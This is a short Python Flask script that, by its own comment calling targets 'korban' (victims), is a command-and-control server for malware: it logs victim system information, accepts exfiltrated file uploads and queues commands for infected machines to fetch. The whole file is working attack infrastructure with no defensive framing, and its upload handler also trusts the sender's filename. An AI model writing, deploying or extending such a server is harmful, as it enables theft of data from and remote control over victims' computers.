from flask import Flask, request, jsonify
import os

app = Flask(__name__)
commands = []  # Menyimpan perintah untuk dikirim ke korban

def log_data(data, filename):
    with open(filename, "a") as f:
        f.write(data + "\n")

@app.route("/keys", methods=["POST"])
def receive_system_info():
    data = request.json
    log_data(str(data), "system_info.log")
    return jsonify({"status": "received"})

@app.route("/uploads", methods=["POST"])
def receive_files():
    if "file" not in request.files:
        return "No file uploaded", 400
    uploaded_file = request.files["file"]
    filepath = os.path.join("uploads", uploaded_file.filename)
    os.makedirs("uploads", exist_ok=True)
    uploaded_file.save(filepath)
    log_data(f"File received: {uploaded_file.filename}", "uploads.log")
    return jsonify({"status": "file received"})

@app.route("/cmd", methods=["GET", "POST"])
def manage_commands():
    global commands
    if request.method == "POST":
        cmd = request.json.get("command")
        if cmd:
            commands.append(cmd)
            log_data(f"Command added: {cmd}", "commands.log")
            return jsonify({"status": "command added"})
    elif request.method == "GET":
        return jsonify({"commands": commands})
    return "Invalid request", 400

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=1224, debug=True)
